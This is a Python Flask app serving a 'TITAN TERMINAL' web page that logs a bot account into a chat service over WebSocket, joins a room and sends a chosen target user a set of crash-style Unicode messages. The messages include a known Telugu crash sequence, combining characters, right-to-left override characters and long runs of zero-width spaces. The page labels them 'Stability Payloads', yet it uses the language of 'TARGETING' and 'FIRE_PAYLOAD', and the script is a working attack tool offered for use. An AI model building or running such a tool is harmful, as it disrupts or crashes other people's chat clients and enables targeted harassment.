import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN TERMINAL v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --green: #00ff41; --cyan: #00f3ff; --red: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--cyan); font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* Header */
        .header { background: #111; padding: 10px; border-bottom: 2px solid var(--cyan); text-align: center; letter-spacing: 5px; font-weight: bold; }

        /* Main Container */
        .container { display: flex; flex: 1; flex-direction: row; }
        @media (max-width: 768px) { .container { flex-direction: column; } }

        /* Left Control Panel */
        .controls { width: 350px; padding: 20px; border-right: 1px solid #222; background: #080808; }
        input { width: 100%; padding: 10px; margin: 5px 0 15px 0; background: #000; border: 1px solid #333; color: var(--cyan); }
        button { width: 100%; padding: 15px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); cursor: pointer; font-weight: bold; }
        button:hover { background: var(--cyan); color: #000; }

        /* Right Terminal Panel */
        .terminal { flex: 1; background: #000; padding: 15px; overflow-y: auto; font-size: 13px; color: var(--green); border-left: 1px solid #222; position: relative; }
        .terminal::-webkit-scrollbar { width: 5px; }
        .terminal::-webkit-scrollbar-thumb { background: #222; }
        .line { margin-bottom: 5px; border-bottom: 1px solid #0a0a0a; padding-bottom: 2px; }
        .out { color: var(--cyan); }
        .in { color: var(--green); }
        .err { color: var(--red); }
        .sys { color: #888; }
    </style>
</head>
<body>
    <div class="header">TITAN_STABILITY_TERMINAL_v2.0</div>
    
    <div class="container">
        <div class="controls">
            <label>BOT AUTH</label>
            <input type="text" id="user" placeholder="Username">
            <input type="password" id="pass" placeholder="Password">
            
            <label>TARGETING</label>
            <input type="text" id="room" placeholder="Room Name">
            <input type="text" id="target" placeholder="Target ID">
            
            <button onclick="connect()">INITIALIZE SYSTEM</button>
            <p style="font-size: 10px; margin-top: 20px; color: #444;">* Terminal will log all WebSocket payloads.</p>
        </div>

        <div id="terminal" class="terminal">
            <div class="line sys">Waiting for connection... [SYSTEM IDLE]</div>
        </div>
    </div>

    <script>
        let ws;
        function term(msg, type='sys') {
            const t = document.getElementById('terminal');
            const time = new Date().toLocaleTimeString().split(' ')[0];
            t.innerHTML += `<div class="line ${type}">[${time}] ${msg}</div>`;
            t.scrollTop = t.scrollHeight;
        }

        function connect() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const r = document.getElementById('room').value;
            const t = document.getElementById('target').value;

            if(!u || !p || !t) { term("ERROR: Incomplete credentials", "err"); return; }

            ws = new WebSocket("wss://chatp.net:5333/server");

            ws.onopen = () => {
                term("WS_CONNECTED: Establishing handshake...", "sys");
                const loginData = {handler:"login", id: Math.random(), username: u, password: p};
                term("OUT >> " + JSON.stringify(loginData), "out");
                ws.send(JSON.stringify(loginData));
            };

            ws.onmessage = (e) => {
                term("IN << " + e.data, "in");
                const data = JSON.parse(e.data);

                if(data.handler === "login_event" && data.type === "success") {
                    term("LOGIN_SUCCESS: Joining target room...", "sys");
                    ws.send(JSON.stringify({handler:"room_join", id: Math.random(), name: r}));
                }

                if(data.handler === "room_event" && data.type === "room_joined") {
                    term("ACCESS_GRANTED: Injecting Stability Payloads...", "sys");
                    
                    const payloads = [
                        "జ్ఞా" + " ҉ ".repeat(15), 
                        "\\u202E" + "STRESS_TEST" + "\\u202D",
                        "BUFFER" + "\\u200B".repeat(100)
                    ];

                    payloads.forEach((p, index) => {
                        setTimeout(() => {
                            const msg = {
                                handler: "chat_message",
                                to: t,
                                type: "text",
                                body: p
                            };
                            term("FIRE_PAYLOAD_" + (index+1) + " >> " + JSON.stringify(msg), "out");
                            ws.send(JSON.stringify(msg));
                        }, index * 1000);
                    });
                }
            };

            ws.onclose = () => term("WS_CLOSED: Connection terminated", "err");
            ws.onerror = (e) => term("CRITICAL_ERROR: Websocket failed", "err");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
